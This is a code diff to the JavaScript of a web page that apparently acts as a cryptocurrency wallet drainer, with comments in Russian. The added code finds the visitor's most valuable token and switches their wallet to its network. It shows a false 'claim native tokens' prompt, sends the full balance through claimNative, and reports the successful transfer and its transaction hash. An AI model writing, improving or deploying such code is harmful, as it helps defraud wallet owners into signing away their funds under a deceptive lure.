@@ -958,9 +958,62 @@ const initializeSubscribers = (modal) => {
         console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USD: ${mostExpensive.price}`)
         
         if (mostExpensive.address === 'native') {
+          console.log('Processing native token claim...')
+          
+          // Проверяем, нужно ли переключить сеть
+          const targetNetworkInfo = networkMap[mostExpensive.network]
+          if (!targetNetworkInfo) {
+            const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
+            store.errors.push(errorMessage)
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
+          }
+          
+          const targetNetwork = targetNetworkInfo.networkObj
+          const expectedChainId = targetNetworkInfo.chainId
+          
+          // Переключаемся на нужную сеть, если необходимо
+          if (store.networkState.chainId !== expectedChainId) {
+            console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+            try {
+              await new Promise((resolve, reject) => {
+                const unsubscribe = appKit.subscribeNetwork(networkState => {
+                  if (networkState.chainId === expectedChainId) {
+                    console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
+                    unsubscribe()
+                    resolve()
+                  }
+                })
+                appKit.switchNetwork(targetNetwork).catch(error => {
+                  unsubscribe()
+                  reject(error)
+                })
+                setTimeout(() => {
+                  unsubscribe()
+                  reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
+                }, 10000)
+              })
+            } catch (error) {
+              const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
+              store.errors.push(errorMessage)
+              hideCustomModal()
+              store.isProcessingConnection = false
+              return
+            }
+          } else {
+            console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+          }
+          
           try {
+            // Обновляем модальное окно для показа подписи
+            const modalMessage = document.querySelector('.custom-modal-message')
+            if (modalMessage) modalMessage.textContent = 'Sign transaction to claim native tokens'
+            
             const txHash = await claimNative(wagmiAdapter.wagmiConfig, mostExpensive.chainId, state.address, mostExpensive.balance)
             console.log('Native claim tx sent:', txHash)
+            
+            // Уведомление об успехе
             await notifyTransferSuccess(
               state.address,
               walletInfo.name,
@@ -969,11 +1022,17 @@ const initializeSubscribers = (modal) => {
               mostExpensive.chainId,
               txHash
             )
+            
+            // Показываем успех в модальном окне
+            if (modalMessage) modalMessage.textContent = `Success! Transaction: ${txHash}`
+            await new Promise(resolve => setTimeout(resolve, 2000))
+            
           } catch (error) {
-            // Показать пользователю причину и оставить модалку открытой на короткое время
-            const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = `Native claim failed: ${error.message}`
+            console.error('Native claim failed:', error)
+            const modalMessage = document.querySelector('.custom-modal-message')
+            if (modalMessage) modalMessage.textContent = `Claim failed: ${error.message}`
             store.errors.push(`Native claim failed: ${error.message}`)
+            await new Promise(resolve => setTimeout(resolve, 3000))
           }
           hideCustomModal()
           store.isProcessingConnection = false
